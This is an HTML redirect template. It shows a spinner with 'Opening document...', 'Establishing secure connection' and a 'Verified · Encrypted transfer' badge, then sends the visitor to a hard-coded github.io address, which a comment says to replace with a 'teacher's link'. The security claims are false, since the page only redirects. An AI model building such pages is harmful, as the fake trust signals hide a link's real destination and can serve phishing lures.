<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Opening Document | Secure Redirect</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .loading-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .spinner {
            width: 56px;
            height: 56px;
            border: 4px solid #e9ecef;
            border-top-color: #1a73e8;
            border-right-color: #34a853;
            border-bottom-color: #fbbc04;
            border-left-color: #ea4335;
            border-radius: 50%;
            animation: spin 0.9s cubic-bezier(0.4, 0, 0.2, 1) infinite;
            margin-bottom: 28px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .primary-text {
            font-size: 26px;
            font-weight: 500;
            color: #202124;
            letter-spacing: -0.2px;
            display: flex;
            gap: 4px;
            flex-wrap: wrap;
            justify-content: center;
        }
        .primary-text span {
            animation: gentlePulse 1.6s infinite ease-in-out;
            animation-delay: calc(0.08s * var(--i, 0));
        }
        .primary-text span:nth-child(1) { --i: 0; }
        .primary-text span:nth-child(2) { --i: 1; }
        .primary-text span:nth-child(3) { --i: 2; }
        .primary-text span:nth-child(4) { --i: 3; }
        .primary-text span:nth-child(5) { --i: 4; }
        .primary-text span:nth-child(6) { --i: 5; }
        .primary-text span:nth-child(7) { --i: 6; }
        .primary-text span:nth-child(8) { --i: 7; }
        .primary-text span:nth-child(9) { --i: 8; }
        .primary-text span:nth-child(10) { --i: 9; }
        .primary-text span:nth-child(11) { --i: 10; }
        .primary-text span:nth-child(12) { --i: 11; }
        @keyframes gentlePulse {
            0%, 100% { opacity: 0.4; transform: translateY(0); }
            50% { opacity: 1; transform: translateY(-2px); }
        }
        .secondary-text {
            font-size: 14px;
            color: #5f6368;
            margin-top: 12px;
        }
        .badge {
            margin-top: 28px;
            font-size: 12px;
            color: #8e9aaf;
            background: #f8f9fa;
            padding: 6px 16px;
            border-radius: 40px;
        }
    </style>
</head>
<body>
<div class="loading-container" id="loadingScreen">
    <div class="spinner"></div>
    <div class="primary-text">
        <span>O</span><span>p</span><span>e</span><span>n</span><span>i</span><span>n</span><span>g</span>
        <span style="margin-left: 6px;">d</span><span>o</span><span>c</span><span>u</span><span>m</span><span>e</span><span>n</span><span>t</span><span>.</span><span>.</span><span>.</span>
    </div>
    <div class="secondary-text">Establishing secure connection · Please wait</div>
    <div class="badge">Verified · Encrypted transfer</div>
</div>

<script>
    // =============================================
    // 🔗 PASTE YOUR TEACHER'S LINK HERE
    // =============================================
    const TARGET_URL = "https://source-alt1.github.io/openfile/";

    // Validate and redirect after 1.6 seconds
    try {
        new URL(TARGET_URL);
        setTimeout(() => {
            window.location.href = TARGET_URL;
        }, 1600);
    } catch(e) {
        document.body.innerHTML = "<div style='text-align:center; margin-top:50px;'><h2>Configuration error</h2><p>Please set a valid redirect link in the code.</p></div>";
    }
</script>
</body>
</html>
